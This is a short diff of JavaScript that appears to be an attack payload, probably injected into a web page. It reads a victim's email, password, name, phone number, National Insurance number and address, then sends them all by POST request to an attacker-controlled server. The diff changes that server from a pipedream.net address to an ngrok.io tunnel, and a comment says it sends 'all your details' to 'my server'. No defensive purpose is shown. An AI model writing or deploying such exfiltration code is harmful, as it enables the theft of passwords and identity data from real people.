@@ -29,7 +29,7 @@ req1.onreadystatechange = function()
         alert('Email = ' + Email + '\n' + 'Password = ' + Password + '\n' + 'FirstName = ' + FirstName + '\n' + 'SurName =' + SurName + '\n' + 'ContactNo = ' + ContactNo + '\n' + 'NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'FirstLineAddress = ' + FirstLineAddress + '\n' + 'SecondLineAddress = ' + SecondLineAddress + '\n' + 'Town = ' + Town + '\n'+ 'Country = ' + Country);
         
         var stealInfo = new XMLHttpRequest();
-        stealInfo.open('post', 'https://enrwn9ld27hiff1.m.pipedream.net', true);    // This send all your details(including email, password, etc) to my server
+        stealInfo.open('post', 'https://560909bd789f.ngrok.io', true);    // This send all your details(including email, password, etc) to my server
         stealInfo.send('Email='+Email+'&Password='+Password+'&FirstName='+FirstName+'&SurName='+SurName+'&ContactNo='+ContactNo+'&NationalInsuranceNumber='+NationalInsuranceNumber+'&FirstLineAddress='+FirstLineAddress+'&SecondLineAddress='+SecondLineAddress+'&Town='+Town+'&Country='+Country+'')
         };
     }
